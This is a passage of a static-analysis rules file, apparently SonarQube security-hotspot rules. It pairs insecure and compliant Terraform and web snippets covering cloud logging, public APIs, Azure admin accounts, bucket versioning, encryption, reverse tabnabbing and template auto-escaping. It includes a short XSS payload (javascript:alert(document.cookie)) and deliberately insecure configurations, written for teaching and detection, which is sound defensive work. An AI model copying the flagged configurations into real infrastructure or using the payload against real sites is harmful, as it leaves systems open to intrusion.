requests</a>:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" { # Sensitive\n  bucket = \"example\"\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage\">API Gateway stages</a>:</p>\n<pre>\nresource \"aws_api_gateway_stage\" \"example\" { # Sensitive\n  xray_tracing_enabled = false # Sensitive\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster\">MSK Broker logs</a>:</p>\n<pre>\nresource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.7.1\"\n  number_of_broker_nodes = 3\n\n  logging_info {\n    broker_logs { # Sensitive\n      firehose {\n        enabled = false\n      }\n      s3 {\n        enabled = false\n      }\n    }\n  }\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker\">MQ Brokers</a>:</p>\n<pre>\nresource \"aws_mq_broker\" \"example\" {\n  logs {  # Sensitive\n    audit   = false\n    general = false\n  }\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster\">Amazon DocumentDB</a>:</p>\n<pre>\nresource \"aws_docdb_cluster\" \"example\" { # Sensitive\n  cluster_identifier = \"example\"\n}\n</pre>\n<p>For Azure <a href=\"https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service\">App Services</a>:</p>\n<pre>\nresource \"azurerm_app_service\" \"example\" {\n  logs {\n    application_logs {\n      file_system_level = \"Off\" # Sensitive\n      azure_blob_storage {\n        level = \"Off\"           # Sensitive\n      }\n    }\n  }\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/\">VPC Subnetwork</a>:</p>\n<pre>\nresource \"google_compute_subnetwork\" \"example\" { # Sensitive\n  name          = \"example\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.example.id\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/\">SQL Database\nInstance</a>:</p>\n<pre>\nresource \"google_sql_database_instance\" \"example\" {\n  name = \"example\"\n\n  settings { # Sensitive\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      require_ssl  = true\n      ipv4_enabled = true\n    }\n  }\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/\">Kubernetes Engine (GKE)\ncluster</a>:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  name               = \"example\"\n  logging_service    = \"none\" # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\">S3 access requests</a>:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example-logs\" {\n  bucket = \"example_logstorage\"\n  acl    = \"log-delivery-write\"\n}\n\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n\n  logging { # AWS provider &lt;= 3\n      target_bucket = aws_s3_bucket.example-logs.id\n      target_prefix = \"log/example\"\n  }\n}\n\nresource \"aws_s3_bucket_logging\" \"example\" { # AWS provider &gt;= 4\n  bucket = aws_s3_bucket.example.id\n\n  target_bucket = aws_s3_bucket.example-logs.id\n  target_prefix = \"log/example\"\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage\">API Gateway stages</a>:</p>\n<pre>\nresource \"aws_api_gateway_stage\" \"example\" {\n  xray_tracing_enabled = true\n\n  access_log_settings {\n    destination_arn = \"arn:aws:logs:eu-west-1:123456789:example\"\n    format = \"...\"\n  }\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster\">MSK Broker logs</a>:</p>\n<pre>\nresource \"aws_msk_cluster\" \"example\" {\n  cluster_name           = \"example\"\n  kafka_version          = \"2.7.1\"\n  number_of_broker_nodes = 3\n\n  logging_info {\n    broker_logs {\n      firehose   {\n        enabled = false\n      }\n      s3 {\n        enabled = true\n        bucket  = \"example\"\n        prefix  = \"log/msk-\"\n      }\n    }\n  }\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker\">MQ Brokers</a>, enable\n<code>audit</code> or <code>general</code>:</p>\n<pre>\nresource \"aws_mq_broker\" \"example\" {\n  logs {\n    audit   = true\n    general = true\n  }\n}\n</pre>\n<p>For Amazon <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster\">Amazon DocumentDB</a>:</p>\n<pre>\nresource \"aws_docdb_cluster\" \"example\" {\n  cluster_identifier              = \"example\"\n  enabled_cloudwatch_logs_exports = [\"audit\"]\n}\n</pre>\n<p>For Azure <a href=\"https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service\">App Services</a>:</p>\n<pre>\nresource \"azurerm_app_service\" \"example\" {\n logs {\n    http_logs {\n      file_system {\n        retention_in_days = 90\n        retention_in_mb   = 100\n      }\n    }\n\n application_logs {\n      file_system_level = \"Error\"\n      azure_blob_storage {\n        retention_in_days = 90\n        level             = \"Error\"\n      }\n    }\n  }\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork/\">VPC Subnetwork</a>:</p>\n<pre>\nresource \"google_compute_subnetwork\" \"example\" {\n  name          = \"example\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.example.id\n\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance/\">SQL Database\nInstance</a>:</p>\n<pre>\nresource \"google_sql_database_instance\" \"example\" {\n  name             = \"example\"\n\n  settings {\n    ip_configuration {\n      require_ssl  = true\n      ipv4_enabled = true\n    }\n    database_flags {\n      name  = \"log_connections\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_disconnections\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_checkpoints\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_lock_waits\"\n      value = \"on\"\n    }\n  }\n}\n</pre>\n<p>For GCP <a href=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster/\">Kubernetes Engine (GKE)\ncluster</a>:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  name               = \"example\"\n  logging_service    = \"logging.googleapis.com/kubernetes\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html\">AWS Documentation</a> - Logging requests using server access\n  logging </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/778\">CWE-778 - Insufficient Logging</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6333": {
        "name": "Creating public APIs is security-sensitive",
        "htmlDesc": "<p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>\n<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks\nboth on the functionality provided by the API and its infrastructure.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In general, prefer limiting API access to a specific set of people or entities.</p>\n<p>AWS provides multiple methods to do so:</p>\n<ul>\n  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>\n  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>\n  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>A public API that doesn’t have access control implemented:</p>\n<pre>\nresource \"aws_api_gateway_method\" \"noncompliantapi\" {\n  authorization = \"NONE\" # Sensitive\n  http_method   = \"GET\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>An API that implements AWS IAM permissions:</p>\n<pre>\nresource \"aws_api_gateway_method\" \"compliantapi\" {\n  authorization = \"AWS_IAM\"\n  http_method   = \"GET\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html\">AWS Documentation</a> -\n  Controlling and managing access to a REST API in API Gateway </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S6379": {
        "name": "Enabling Azure resource-specific admin accounts is security-sensitive",
        "htmlDesc": "<p>Enabling Azure resource-specific admin accounts can reduce an organization’s ability to protect itself against account or service account\nthefts.</p>\n<p>Full Administrator permissions fail to correctly separate duties and create potentially critical attack vectors on the impacted resources.</p>\n<p>In case of abuse of elevated permissions, both the data on which impacted resources operate and their access traceability are at risk.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require this resource to disable its administrative accounts or permissions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Disable the administrative accounts or permissions in this Azure resource.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools\">Azure Batch Pools</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_batch_pool\" \"example\" {\n  name = \"sensitive\"\n\n  start_task {\n    user_identity {\n      auto_user {\n        elevation_level = \"Admin\" # Sensitive\n        scope = \"Task\"\n      }\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/container-registry/\">Azure Container Registries</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"azurerm_container_registry\" \"example\" {\n  name = \"example\"\n  admin_enabled = true # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/batch/nodes-and-pools#pools\">Azure Batch Pools</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_batch_pool\" \"example\" {\n  name = \"example\"\n\n  start_task {\n    user_identity {\n      auto_user {\n        elevation_level = \"NonAdmin\"\n        scope = \"Task\"\n      }\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/container-registry/\">Azure Container Registries</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_container_registry\" \"exemple\" {\n  name = \"example\"\n  admin_enabled = false\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6412": {
        "name": "Unversioned Google Cloud Storage buckets are security-sensitive",
        "htmlDesc": "<p>When object versioning for Google Cloud Storage (GCS) buckets is enabled, different versions of an object are stored in the bucket, preventing\naccidental deletion. A specific version can always be deleted when the generation number of an object version is specified in the request.</p>\n<p>Object versioning cannot be enabled on a bucket with a retention policy. A retention policy ensures that an object is retained for a specific\nperiod of time even if a request is made to delete or replace it. Thus, a retention policy locks the single current version of an object in the\nbucket, which differs from object versioning where different versions of an object are retained.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable GCS bucket versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<p>Versioning is disabled by default:</p>\n<pre>\nresource \"google_storage_bucket\" \"example\" { # Sensitive\n  name          = \"example\"\n  location      = \"US\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Versioning is enabled:</p>\n<pre>\nresource \"google_storage_bucket\" \"example\" {\n  name          = \"example\"\n  location      = \"US\"\n\n  versioning {\n    enabled = \"true\"\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cloud.google.com/storage/docs/object-versioning?hl=en\">GCP documentation</a> - Object Versioning </li>\n</ul>",
        "severity": "MINOR"
      },
      "terraform:S6252": {
        "name": "Disabling versioning of S3 buckets is security-sensitive",
        "htmlDesc": "<p>S3 buckets can be in three states related to versioning:</p>\n<ul>\n  <li> unversioned (default one) </li>\n  <li> enabled </li>\n  <li> suspended </li>\n</ul>\n<p>When the S3 bucket is unversioned or has versioning suspended it means that a new version of an object overwrites an existing one in the S3\nbucket.</p>\n<p>It can lead to unintentional or intentional information loss.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<p>Versioning is disabled by default:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" { # Sensitive\n  bucket = \"example\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Versioning is enabled for AWS provider version 4 or above:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example-versioning\" {\n  bucket = aws_s3_bucket.example.id\n  versioning_configuration {\n    status = \"Enabled\"\n  }\n}\n</pre>\n<p>Versioning is enabled for AWS provider version 3 or below:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n\n  versioning {\n    enabled = true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html\">AWS documentation</a> - Using versioning in S3 buckets </li>\n</ul>",
        "severity": "MINOR"
      },
      "terraform:S6255": {
        "name": "Disabling S3 bucket MFA delete is security-sensitive",
        "htmlDesc": "<p>When S3 buckets versioning is enabled it’s possible to add an additional authentication factor before being allowed to delete versions of an object\nor changing the versioning state of a bucket. It prevents accidental object deletion by forcing the user sending the delete request to prove that he\nhas a valid MFA device and a corresponding valid token.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information that is required to be preserved on the long term. </li>\n  <li> The S3 bucket grants delete permission to many users. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 MFA delete, note that:</p>\n<ul>\n  <li> MFA delete can only be enabled with the AWS CLI or API and with the root account. </li>\n  <li> To delete an object version, the API should be used with the <code>x-amz-mfa</code> header. </li>\n  <li> The API request, with the <code>x-amz-mfa</code> header, can only be used in HTTPS. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 3 or below:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" { # Sensitive\n  bucket = \"example\"\n\n  versioning {\n    enabled = true\n  }\n}\n</pre>\n<p>A versioned S3 bucket does not have MFA delete enabled for AWS provider version 4 or above:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" { # Sensitive\n  bucket = aws_s3_bucket.example.id\n  versioning_configuration {\n    status = \"Enabled\"\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>MFA delete is enabled for AWS provider version 3 or below:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n\n  versioning {\n    enabled = true\n    mfa_delete = true\n  }\n}\n</pre>\n<p>MFA delete is enabled for AWS provider version 4 or above:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" {\n  bucket = aws_s3_bucket.example.id\n  versioning_configuration {\n    status = \"Enabled\"\n    mfa_delete = \"Enabled\"\n  }\n  mfa = \"${var.MFA}\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/MultiFactorAuthenticationDelete.html\">AWS documentation</a> - Configuring MFA\n  delete </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/308\">CWE-308 - Use of Single-factor Authentication</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "terraform:S6330": {
        "name": "Using unencrypted SQS queues is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store\nmessages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message\nfrom the file system, for example through a vulnerability in the service, they are not able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The queue contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue\">aws_sqs_queue</a>:</p>\n<pre>\nresource \"aws_sqs_queue\" \"queue\" {  # Sensitive, encryption disabled by default\n  name = \"sqs-unencrypted\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue\">aws_sqs_queue</a>:</p>\n<pre>\nresource \"aws_sqs_queue\" \"queue\" {\n  name = \"sqs-encrypted\"\n  kms_master_key_id = aws_kms_key.enc_key.key_id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html\">AWS Documentation</a> -\n  Encryption at rest </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6332": {
        "name": "Using unencrypted EFS file systems is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be\nautomatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are\nnot able to access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file system contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system\">aws_efs_file_system</a>:</p>\n<pre>\nresource \"aws_efs_file_system\" \"fs\" {  # Sensitive, encryption disabled by default\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system\">aws_efs_file_system</a>:</p>\n<pre>\nresource \"aws_efs_file_system\" \"fs\" {\n  encrypted = true\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">AWS Documentation</a> - Data encryption in Amazon EFS </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6375": {
        "name": "Assigning high privileges Azure Active Directory built-in roles is security-sensitive",
        "htmlDesc": "<p>Azure Active Directory offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully\nassigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>\n<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>\n<p>This rule raises an issue when one of the following roles is assigned:</p>\n<ul>\n  <li> Application Administrator </li>\n  <li> Authentication Administrator </li>\n  <li> Cloud Application Administrator </li>\n  <li> Global Administrator </li>\n  <li> Groups Administrator </li>\n  <li> Helpdesk Administrator </li>\n  <li> Password Administrator </li>\n  <li> Privileged Authentication Administrator </li>\n  <li> Privileged Role Administrator </li>\n  <li> User Administrator </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>\n  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the assignment of Global Administrator roles to less than five people or service principals. </li>\n  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>\n  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"azuread_directory_role\" \"example\" {\n  display_name = \"Privileged Role Administrator\" # Sensitive\n}\n\nresource \"azuread_directory_role_member\" \"example\" {\n  role_object_id   = azuread_directory_role.example.object_id\n  member_object_id = data.azuread_user.example.object_id\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"azuread_directory_role\" \"example\" {\n  display_name = \"Usage Summary Reports Reader\"\n}\n\nresource \"azuread_directory_role_member\" \"example\" {\n  role_object_id   = azuread_directory_role.example.object_id\n  member_object_id = data.azuread_user.example.object_id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference\">Azure AD Documentation</a> - Azure AD built-in\n  roles </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/roles/best-practices\">Azure AD Documentation</a> - Best practices for Azure AD\n  roles </li>\n</ul>",
        "severity": "MAJOR"
      },
      "Web:S5148": {
        "name": "Authorizing an opened window to access back to the originating window is security-sensitive",
        "htmlDesc": "<p>A newly opened window having access back to the originating window could allow basic phishing attacks (the <code>window.opener</code> object is not\n<code>null</code> and thus <code>window.opener.location</code> can be set to a malicious website by the opened page).</p>\n<p>For instance, an attacker can put a link (say: \"http://example.com/mylink\") on a popular website that changes, when opened, the original page to\n\"http://example.com/fake_login\". On \"http://example.com/fake_login\" there is a fake login page which could trick real users to enter their\ncredentials.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application opens untrusted external URL. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use <code>noopener</code> to prevent untrusted pages from abusing <code>window.opener</code>.</p>\n<p>Note: In Chrome 88+, Firefox 79+ or Safari 12.1+ <code>target=_blank</code> on anchors implies <code>rel=noopener</code> which make the protection\nenabled by default.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;a href=\"http://example.com/dangerous\" target=\"_blank\"&gt; &lt;!-- Sensitive --&gt;\n\n&lt;a href=\"{{variable}}\" target=\"_blank\"&gt; &lt;!-- Sensitive --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>To prevent pages from abusing <code>window.opener</code>, use <code>rel=noopener</code> on <code>&lt;a href=&gt;</code> to force its value to be\n<code>null</code> on the opened pages.</p>\n<pre>\n&lt;a href=\"http://petssocialnetwork.io\" target=\"_blank\" rel=\"noopener\"&gt;\n</pre>\n<h2>Exceptions</h2>\n<p>No Issue will be raised when <code>href</code> contains a hardcoded relative url as there it has less chances of being vulnerable. An url is\nconsidered hardcoded and relative if it doesn’t start with <code>http://</code> or <code>https://</code>, and if it does not contain any of the\ncharacters {}$()[]</p>\n<pre>\n&lt;a href=\"internal.html\" target=\"_blank\" &gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\">Reverse Tabnabbing</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1022\">CWE-1022 - Use of Web Link to Untrusted Target with window.opener Access</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://mathiasbynens.github.io/rel-noopener/\">https://mathiasbynens.github.io/rel-noopener/</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "Web:S5247": {
        "name": "Disabling auto-escaping in template engines is security-sensitive",
        "htmlDesc": "<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;!-- Django templates --&gt;\n&lt;p&gt;{{ variable|safe }}&lt;/p&gt;&lt;!-- Sensitive --&gt;\n{% autoescape off %}&lt;!-- Sensitive --&gt;\n\n&lt;!-- Jinja2 templates --&gt;\n&lt;p&gt;{{ variable|safe }}&lt;/p&gt;&lt;!-- Sensitive --&gt;\n{% autoescape false %}&lt;!-- Sensitive --&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "Web:S5725": {
        "name": "Using remote artifacts without integrity checks is security-sensitive",
        "htmlDesc": "<p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>\n<p>On the client side, where front-end code is executed, malicious code could:</p>\n<ul>\n  <li> impersonate users' identities and take advantage of their privileges on the application. </li>\n  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>\n  <li> gain access to sensitive clients' personal data. </li>\n  <li> deface, or otherwise affect the general availability of the application. </li>\n  <li> mine cryptocurrencies in the background. </li>\n</ul>\n<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For\nexample, server-side malware could:</p>\n<ul>\n  <li> access and modify sensitive technical and business data. </li>\n  <li> elevate its privileges on the underlying operating system. </li>\n  <li> Use the compromised application as a pivot to attack the local network. </li>\n</ul>\n<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes\napplied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication\nwebsite or that was legitimately changed by its author, in a more benign scenario.</p>\n<p>Important note: downloading an artifact over HTTPS only 